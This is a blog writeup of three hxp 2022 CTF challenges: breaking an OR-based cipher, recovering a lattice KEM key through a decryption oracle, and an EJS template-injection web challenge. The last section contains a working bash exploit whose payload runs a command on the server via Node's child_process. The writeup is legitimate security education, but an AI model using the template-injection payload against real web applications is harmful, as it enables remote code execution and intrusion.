---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "hxp 2022 (2023) CTF writeup"
subtitle: ""
summary: ""
authors: ['thom']
tags: ['ctf', 'crypto']
categories: []
date: 2023-03-13T17:01:29+01:00
lastmod: 2023-03-13T17:01:29+01:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

math: true

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---

After I found myself in a vacation rental with [Bas](https://bas.westerbaan.name) and [Joost](https://joostrijneveld.nl),
we thought it would be fun to have a go at a few of [hxp](https://hxp.io)'s ~~2022~~ 2023 ctf challenges as team `#RU` (long story relating to Radboud University).

Then I thought it would be fun to post a writeup of the challenges that we solved.

## yor

The Yor challenge code was given as follows:

```python
#!/usr/bin/env python3
import random

greets = [
        "Herzlich willkommen! Der Schlüssel ist {0}, und die Flagge lautet {1}.",
        "Bienvenue! Le clé est {0}, et le drapeau est {1}.",
        "Hartelĳk welkom! De sleutel is {0}, en de vlag luidt {1}.",
        "ようこそ！鍵は{0}、旗は{1}です。",
        "歡迎！鑰匙是{0}，旗幟是{1}。",
        "Witamy! Niestety nie mówię po polsku...",
    ]

flag = open('flag.txt').read().strip()
assert set(flag.encode()) <= set(range(0x20,0x7f))

key = bytes(random.randrange(256) for _ in range(16))
hello = random.choice(greets).format(key.hex(), flag).encode()

output = bytes(y | key[i%len(key)] for i,y in enumerate(hello))
print(output.hex())
```

So TL;DR: this challenge selects a greeting from the list, and then generates a random fixed-length key, which it `or`s into every byte of the greeting.
Before "encrypting", it insert the key and the flag into the message.
Note that we get a new key every time, so it's no sense to try to recover the key from more than one message.
After a way too long time mucking about trying to overlay the message on itself to recover the key, we realized that the common denominator is the plain text message, which is _mostly_ the same every single message.
However, the message is using `|`, not `^`, so it only adds additional bits to the message and never turns off the bits that were originally set.
That means that if we collect enough messages $m'_i = (m | key)$ then we can recover $m$ by doing (using $\prod$ for binary and):

$$ {\prod}\limits_{i} m'_i = m $$

Implementing this:

```python
from binascii import unhexlify
import socket
HOST = "HOSTNAME"
PORT = 10101

def remote():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM,) as s:
        s.connect((HOST, PORT))
        data = s.recv(1000)
        return data.strip()

# For large enough n, get encrypted $m'$s
texts = [remote() for _ in range(1000)]

# Filter out those with the longest length arbitrarily
bytetexts = [unhexlify(text) for text in texts if len(text) == 246]
message = bytearray(bytetexts[0])

# for each m' (bytetexts), AND each character into the message
for text in bytetexts:
    for i, char in enumerate(text):
        message[i] &= char

# Print the decrypted message.
print(message.decode())
```

Resulting output:

```
Bienvenue! Le clé est                                 , et le drapeau est hxp{WhY_5et7L3_f0r_X0R_iF_y0u_C4n_h4v3_Y0R????}.
```

Note that we will likely get a bunch of noise and/or spaces in the decrypted message in the position of the key:
that's what happens when you AND a bunch of hex characters that _are_ different each time together.


## Whistler

In this challenge, we were given a lattice-based KEM.
As we've seen a few of them before, we immediately noticed that the KEM has no Fujisaki-Okamoto transform, and thus is not IND-CCA secure.
This means that we can mess with the ciphertexts: they are malleable.
We also get a variant on a decryption oracle: however, this decryption oracle has a twist: we obtain an _encryption_ under the decapsulated key.

We focused on the `decaps` operation:
```python
def decaps(sk, ct):
    s = sk
    c,r = ct
    d = mul(c,s)
    return extract(r,d)
```

Writing this in a way that suggests I know more maths than I do, decaps returns:

$$ k = \operatorname{extract}_r( \langle c, s \rangle ).$$

We also know by how `encaps` and `extract` work that the bits in the shared secret resemble if the product of $\langle c, s \rangle$ was positive for that position in the resulting vector, but that turns out to not be terribly important.
The extract operator is a bit spicy: it allows us to _set_ which bits of $\langle c, s \rangle$ we want to use in the key.
We abuse this to determine which bits of $k$ are set, by providing $r$ set to zero and then turning each bit in $r$ on one-at-a-time, which, if the returned key changes, means that the bit has an effect on the result.
However, we do not know if we get a all-$1$ or all-$0$ result out of the box, so we need two additional guesses at the end to try both possibilities.
Additionally, the challenge oracle checks if $\operatorname{hw}(r) \ge 128$, so we need to actually split $r$ into two parts.
First we set the high part to all-1, so the hamming weight is large enough, while we set each bit of $r_i = 1$  one at a time,
then we set the low part of $r$ to all ones, and set each bit $r_{128+i} = 1$ one at a time.
This also means that we have two more possibilities, because we need to figure out the correct assignment of the high part and low parts separately.
In total, we need $256 + 2 \times 2$ queries.
We can check which of our guesses is the correct encryption key by using it to encrypt the proper

This sounds a bit confusing, but we have ~~pseudocode~~ python:

```python
import collections
import socket
import struct
import itertools

# Use the provided code as helper code
import vuln

HOST = "HOST"
PORT = 4421

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection = s.connect((HOST, PORT))

# First fetch the challenge: the public key and ciphertext.
# We don't need the public key
data = s.recv(99999999)
print(data.decode())

pk_0, pk_1, ct_0, ct_1, flag_enc = data.decode().strip().split("\n")

# unhex and un-binary-decode the data
c = list(struct.unpack('<256H', bytes.fromhex(ct_0.strip().split(" ")[1])))
# nice way of unbinary-ing a "101011" string, thanks hxp.
r = list(map('01'.index, ct_1.strip().split(" ")[1]))

# We model our challenge oracle in this way:
def oracle(c_, r_):
    s.send(vuln.ppoly(c_).encode() + b"\n")
    s.send(vuln.pbits(r_).encode() + b"\n")
    return s.recv(100000).strip().decode()

# For those playing at home:
#def oracle(c, r):
#    bits = decaps(sk, (c, r))
#    return mkaes([1]+bits).encrypt(b'hxp<3you').hex()

# These dicts map encrypted messages to the bits that, when set, made them appear
# We should get exactly two messages
entries_lo = defaultdict(list)
entries_hi = defaultdict(list)
for b in range(256 // 2):
    # set r' = (0, 0, ..., 0, 1, 1, .., 1)
    r_ = [0] * 128 + [1] * 128
    # set r'_i = 1
    r_[b] = 1
    # get the encrypted message for this (c, r')
    dh = oracle(c, r_)
    entries_lo[dh].append(b)

for b in range(256 // 2, 256):
    # set r' = (1, 1, ..., 1, 0, 0, .., 0)
    r_ = [1] * 128 + [0] * 128
    # set r'_i = 1
    r_[b] = 1
    # get the encrypted message m' for this (c, r')
    dh = oracle(c, r_)
    entries_hi[dh].append(b)


# Set up our two candidates for the low part of `bits`:
candidates_lo = [[0] * 128 for _ in range(2)]
eerste, tweede = list(entries_lo.keys())

# either the set of bits we found for message m'_0 is 1
for b in entries_lo[eerste]:
    candidates_lo[0][b] = 1
    # (note that the other bits (ie. those in `eerste`) are already 0

# or the set of bits we found for message m'_1 is 1
for b in entries_lo[tweede]:
    candidates_lo[1][b] = 1


# Set up our two candidates for the high part of `bits`:
candidates_hi = [[0] * 128 for _ in range(2)]
eerste, tweede = list(entries_hi.keys())
for b in entries_hi[eerste]:
    candidates_hi[0][b - 128] = 1
for b in entries_hi[tweede]:
    candidates_hi[1][b - 128] = 1


original = vuln.oracle(c, r)
print("original = ", original)

# check which guess is correct
for (lo, hi) in itertools.product(candidates_lo, candidates_hi):
    bits = [bit for (bit, t) in zip((lo + hi), r) if t]
    if original == vuln.mkaes([1]+bits).encrypt(b'hxp<3you').hex():
        break
else:
    raise Exception("not found")

print(vuln.mkaes([0]+bits).decrypt(bytes.fromhex(flag_enc.split(":")[1].strip())))
```
Obtains: `hxp{e4zy_p34zY_p34nuT_Bu7t3r}`

## Valentine

We also solved the web challenge `valentine`: we found that we could upload our own challenges and noticed that `query` was passed to the `ejs` renderer instead of just the `name`.
Then we realised that we could change the delimiter by passing it as a query parameter, and then inject some javascript that executed `/readflag`.
Finding the code to execute `/readflag` took the most time.

For a change, we wrote this one in `bash` because I had started out by messing with cURL:

```sh
#!/bin/bash

HOST="HOST"

attack="<?= process.mainModule.require('child_process').execSync('/readflag') ?>"

# Upload template
output="$(curl --fail-with-body -X POST -d "name=test&tmpl=${attack}" ${HOST}/template 2>/dev/null)"
if ! [ "$?" = "0" ]; then
    echo $output
    exit 1
fi

# Parse out the location of the template that is returned by the server
url=$(echo ${output} | cut -d/ -f2 | cut -d? -f1)


# Fetch with our custom query parameters
curl ${HOST}/$url"?name=test&delimiter=?"
# ensure eol
echo
```

We obtain `hxp{W1ll_u_b3_my_V4l3nt1ne?}`.

The [hxp team's writeup](https://hxp.io/blog/101/hxp-CTF-2022-valentine/) has some more details, though we did not really run into any trouble with the ejs production settings:
`curl` does not follow `Location` headers by default.

